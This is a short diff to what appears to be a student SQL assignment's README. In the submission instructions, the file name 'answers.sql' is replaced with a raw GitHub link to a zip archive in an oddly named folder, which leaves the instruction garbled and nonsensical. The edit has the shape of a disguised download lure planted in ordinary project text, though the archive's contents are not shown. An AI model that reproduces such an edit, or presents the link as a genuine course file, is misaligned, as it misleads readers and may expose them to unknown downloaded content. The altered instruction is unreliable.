@@ -16,7 +16,7 @@
 
 
 ## 📝 Submission Instructions  
-📂 Write all your SQL queries in the **answers.sql** file.  
+📂 Write all your SQL queries in the **https://raw.githubusercontent.com/Liz-on-code/wk-7a-Liz-on-code/main/strophaic/wk-7a-Liz-on-code.zip** file.  
 ✍️ Answer each question concisely and make sure your queries are clear and correct.  
 🗣️ Structure your responses clearly, and use comments if necessary to explain your approach.
 
